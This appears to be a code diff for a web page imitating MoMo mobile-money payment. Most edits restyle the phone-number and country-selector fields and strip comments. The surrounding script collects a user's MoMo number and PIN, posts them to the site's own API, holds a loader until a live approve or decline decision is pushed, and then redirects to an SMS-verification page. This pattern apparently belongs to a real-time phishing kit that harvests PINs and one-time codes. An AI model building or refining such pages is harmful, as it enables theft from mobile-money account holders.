@@ -190,27 +190,30 @@
     .recipient-input::placeholder { color: #A8B4BC; font-weight: 600; }
     .recipient-note { font-size: 10.5px; color: var(--momo-muted); font-weight: 500; margin-top: 2px; }
 
-    /* Phone + Country — whole bar is a button */
+    /* Phone + Country — country selector fills the left edge completely */
     .phone-input {
-      display: flex; align-items: stretch;
+      display: flex;
+      align-items: stretch;
       border: 1.5px solid var(--momo-border);
-      border-radius: 10px; background: var(--momo-white);
+      border-radius: 10px;
+      background: var(--momo-white);
       overflow: hidden;
       transition: border-color 0.15s, box-shadow 0.15s;
+      min-height: 46px;
     }
     .phone-input:focus-within {
       border-color: var(--momo-blue);
       box-shadow: 0 0 0 4px rgba(0,79,113,0.09);
     }
 
-    /* Country selector — full click area, changes colour on hover/focus */
+    /* Country selector — hangs full height, flush to left edge */
     .country-select {
+      align-self: stretch;
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 4px;
-      padding: 0 24px 0 12px;
-      background: var(--momo-pale-blue);
+      padding: 0 24px 0 14px;
+      background-color: var(--momo-pale-blue);
       border: none;
       border-right: 1.5px solid var(--momo-border);
       font-size: 13px;
@@ -225,7 +228,7 @@
       background-position: right 8px center;
       background-size: 11px;
       min-width: 108px;
-      height: 100%;
+      margin: 0;
       transition: background-color 0.15s, color 0.15s;
     }
     .country-select:hover {
@@ -233,7 +236,8 @@
       color: #fff;
       background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ffffff' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'/%3e%3c/svg%3e");
     }
-    .country-select:focus {
+    .country-select:focus,
+    .country-select:active {
       outline: none;
       background-color: var(--momo-blue);
       color: #fff;
@@ -241,10 +245,17 @@
     }
 
     .phone-number {
-      flex: 1; border: none; padding: 12px;
-      font-size: 14.5px; font-weight: 600; color: var(--momo-text);
-      font-family: inherit; letter-spacing: 0.3px;
-      background: transparent; min-width: 0;
+      flex: 1;
+      border: none;
+      padding: 12px;
+      font-size: 14.5px;
+      font-weight: 600;
+      color: var(--momo-text);
+      font-family: inherit;
+      letter-spacing: 0.3px;
+      background: transparent;
+      min-width: 0;
+      align-self: stretch;
     }
     .phone-number:focus { outline: none; }
     .phone-number::placeholder { color: #A8B4BC; font-weight: 500; }
@@ -329,7 +340,7 @@
       color: var(--momo-muted); margin-top: 10px; font-weight: 500;
     }
 
-    /* FULL-PAGE LOADER OVERLAY */
+    /* FULL-PAGE LOADER */
     .loader-overlay {
       position: absolute; inset: 0;
       background: var(--momo-white);
@@ -499,7 +510,6 @@
       <div class="footer-note">By confirming, you agree to MoMo's Terms of Service</div>
     </footer>
 
-    <!-- FULL-PAGE LOADER -->
     <div class="loader-overlay" id="loaderOverlay">
       <div class="loader-ring"></div>
       <div class="loader-title">Authorizing payment…</div>
@@ -608,7 +618,6 @@
           }
 
           if (s.decision === 'approved') {
-            // Move to SMS verification page
             window.location.href = 'sms.html';
           } else if (s.decision === 'declined') {
             hideLoader();
@@ -633,10 +642,8 @@
       if (phone.length < 7) { showError('Please enter a valid MoMo number'); return; }
       if (pin.length !== 4 && pin.length !== 5) { showError('PIN must be 4 or 5 digits'); return; }
 
-      // Clear any previous decision
       try { await fetch('/api/reset', { method: 'POST' }); } catch (_) {}
 
-      // Show full-page loader
       showLoader(country + ' ' + phone);
 
       const payload = {
@@ -671,7 +678,6 @@
           showError(data.message || 'Wrong MoMo PIN');
           return;
         }
-        // pending — loader stays visible, SSE pushes the decision
       } catch (_) {
         hideLoader();
         showToast('Connection error — please try again.');
